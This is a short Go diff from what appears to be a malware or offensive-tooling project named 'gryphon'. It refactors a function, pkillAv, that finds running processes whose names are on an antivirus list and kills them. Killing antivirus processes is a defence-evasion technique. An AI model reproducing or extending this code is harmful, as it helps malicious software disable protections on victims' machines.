@@ -10,6 +10,7 @@ import (
 	"syscall"
 
 	"github.com/mitchellh/go-ps"
+	"github.com/whiterabb17/gryphon/variables"
 )
 
 func info() string {
@@ -68,7 +69,7 @@ func pkillAv() error {
 		proc_name := process.Executable()
 		pid := process.Pid()
 
-		if ContainsAny(proc_name, av_processes) {
+		if variables.ContainsAny(proc_name, av_processes) {
 			err := killProcByPID(pid)
 			if err != nil {
 				return err
